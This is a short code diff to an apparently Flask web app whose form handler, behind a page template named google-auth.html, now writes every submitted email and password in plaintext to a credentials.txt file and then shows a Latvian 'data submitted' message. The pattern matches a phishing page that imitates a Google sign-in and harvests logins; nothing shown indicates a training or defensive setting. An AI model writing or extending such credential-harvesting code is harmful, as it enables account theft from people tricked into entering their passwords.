@@ -14,4 +14,10 @@ def show_form():
 def handle_form():
     email = request.form['email']
     password = request.form['password']
+
+    # Saglabāšana failā:
+    with open("credentials.txt", "a", encoding="utf-8") as file:
+        file.write(f"{email} | {password}\n")
+
     return render_template('google-auth.html', message="Dati iesniegti!")
+    
